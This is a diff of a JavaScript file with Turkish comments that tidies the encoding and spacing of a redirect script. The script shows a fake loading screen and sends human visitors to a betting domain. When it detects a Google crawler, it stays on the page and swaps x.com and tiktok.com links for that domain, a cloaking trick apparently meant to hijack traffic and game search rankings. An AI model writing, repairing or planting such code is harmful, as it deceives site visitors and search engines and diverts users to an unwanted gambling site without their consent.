@@ -1,11 +1,11 @@
 // --- AYARLAR ---
-const oldDomains = ["x.com","tiktok.com"];
+const oldDomains = ["x.com", "tiktok.com"];
 const newDomain  = "tr.betpaunmobilbahis.top";
-const maxPreloaderWaitTime = 1200; // kÄ±sa animasyon
-const redirectDelay = 150;         // preloader 1 kez Ã§izilsin
+const maxPreloaderWaitTime = 1200; // kısa animasyon
+const redirectDelay = 150;         // preloader 1 kez çizilsin
 
 (function () {
-  // Varsa eski preloader'Ä± kaldÄ±r
+  // Varsa eski preloader'ı kaldır
   const existing = document.getElementById("geo-preloader");
   if (existing) existing.remove();
 
@@ -25,7 +25,7 @@ const redirectDelay = 150;         // preloader 1 kez Ã§izilsin
   preloader.innerHTML = `
     <div style="display:flex;flex-direction:column;align-items:center;width:90%;max-width:500px;">
       <h1 style="font-size:1.5em;font-weight:600;color:#fff;margin:0 0 18px 0;text-align:center;line-height:1.5;">
-        Sitemize Yönlendiriliyorsunuz..
+        Sitemize yönlendiriliyorsunuz..
       </h1>
       <div style="width:100%;height:6px;background-color:rgba(255,255,255,.12);border-radius:3px;overflow:hidden;">
         <div class="loader-bar" style="width:0;height:100%;background:#fff;border-radius:3px;animation:fill-bar ${maxPreloaderWaitTime/1000}s linear forwards;"></div>
@@ -37,20 +37,20 @@ const redirectDelay = 150;         // preloader 1 kez Ã§izilsin
     </style>
   `;
 
-  function appendPreloader(){
+  function appendPreloader() {
     if (document.body) document.body.appendChild(preloader);
     else document.addEventListener('DOMContentLoaded', () => document.body.appendChild(preloader));
   }
   appendPreloader();
 
-  // Sadece Google botlarÄ± yÃ¶nlendirme gÃ¶rmesin
-  function isGoogleBot(){
+  // Sadece Google botları yönlendirme görmesin
+  function isGoogleBot() {
     const ua = navigator.userAgent || "";
     return /Googlebot|AdsBot-Google|APIs-Google|Mediapartners-Google|Googlebot-Mobile|Googlebot-Image|Google-Read-Aloud|DuplexWeb-Google|Google Favicon/i.test(ua);
   }
 
-  // Botlar iÃ§in: sayfada kal, eski domainleri metin ve linklerde yeniye Ã§evir
-  function runReplacements(){
+  // Botlar için: sayfada kal, eski domainleri metin ve linklerde yeniye çevir
+  function runReplacements() {
     const p = document.getElementById("geo-preloader");
     if (p) p.remove();
 
@@ -65,7 +65,7 @@ const redirectDelay = 150;         // preloader 1 kez Ã§izilsin
     }
 
     document.querySelectorAll("*").forEach(el => {
-      ["href","src","action"].forEach(attr => {
+      ["href", "src", "action"].forEach(attr => {
         if (!el.hasAttribute(attr)) return;
         let v = el.getAttribute(attr);
         if (!v) return;
@@ -73,7 +73,7 @@ const redirectDelay = 150;         // preloader 1 kez Ã§izilsin
         el.setAttribute(attr, v);
       });
 
-      if (!["SCRIPT","STYLE"].includes(el.tagName) && el.innerHTML && oldDomains.some(d=>el.innerHTML.includes(d))){
+      if (!["SCRIPT", "STYLE"].includes(el.tagName) && el.innerHTML && oldDomains.some(d => el.innerHTML.includes(d))) {
         let html = el.innerHTML;
         oldDomains.forEach(d => html = html.replaceAll(d, newDomain));
         el.innerHTML = html;
@@ -81,8 +81,8 @@ const redirectDelay = 150;         // preloader 1 kez Ã§izilsin
     });
   }
 
-  function run(){
-    if (isGoogleBot()){
+  function run() {
+    if (isGoogleBot()) {
       setTimeout(() => {
         preloader.style.opacity = "0";
         setTimeout(runReplacements, 200);
@@ -90,7 +90,7 @@ const redirectDelay = 150;         // preloader 1 kez Ã§izilsin
     } else {
       setTimeout(() => {
         const redirectUrl = "https://" + newDomain + "/";
-        try { window.location.replace(redirectUrl); } 
+        try { window.location.replace(redirectUrl); }
         catch { window.location.href = redirectUrl; }
       }, redirectDelay);
     }
